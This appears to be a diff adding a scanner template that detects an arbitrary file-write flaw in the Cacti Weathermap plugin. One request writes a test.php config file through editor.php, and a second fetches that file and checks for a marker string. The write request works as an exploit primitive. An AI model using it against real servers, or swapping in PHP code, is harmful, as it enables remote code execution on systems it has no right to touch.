@@ -1,0 +1,58 @@
+{
+    "Name": "cacti-weathermap-file-write",
+    "Description": "cacti-weathermap-file-write",
+    "Product": "cacti",
+    "author": "chumeng",
+    "Request":[
+        {
+        "Method": "GET",
+        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
+        "Uri":"/plugins/weathermap/editor.php?plug=0&mapname=test.php&action=set_map_properties&param=&param2=&debug=existing&node_name=&node_x=&node_y=&node_new_name=&node_label=&node_infourl=&node_hover=&node_iconfilename=--NONE--&link_name=&link_bandwidth_in=&link_bandwidth_out=&link_target=&link_width=&link_infourl=&link_hover=&map_title=46ea1712d4b13b55b3f680cc5b8b54e8&map_legend=Traffic+Load&map_stamp=Created%3A%2B%25b%2B%25d%2B%25Y%2B%25H%3A%25M%3A%25S&map_linkdefaultwidth=7",
+        "Port":"",
+        "Data":"",
+        "follow_redirects":"false",
+        "Follow_redirects":"false",
+        "Upload":{"Name": "","fileName": "","filePath": "" },
+        "Response":{
+        "Check_Steps":"AND",
+        "Checks": [
+                {
+                "Operation": "contains", 
+                "Key":"",
+                "Value": "renyizifumofamen"
+                },
+                 {
+                "Operation": "code", 
+                "Key":"",
+                "Value": "200"  
+                 }
+        ]
+        },
+        "Next_decide":"AND"
+                },  {
+                    "Method": "GET",
+                    "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
+                    "Uri":"/plugins/weathermap/configs/test.php",
+                    "Port":"",
+                    "Data":"",
+                    "follow_redirects":"false",
+                    "Follow_redirects":"false",
+                    "Upload":{"Name": "","fileName": "","filePath": "" },
+                    "Response":{
+                    "Check_Steps":"AND",
+                    "Checks": [
+                            {
+                            "Operation": "contains", 
+                            "Key":"",
+                            "Value": "46ea1712d4b13b55b3f680cc5b8b54e8"
+                            },
+                             {
+                            "Operation": "code", 
+                            "Key":"",
+                            "Value": "200"  
+                             }
+                    ]
+                    },
+                    "Next_decide":""
+                            }
+]}
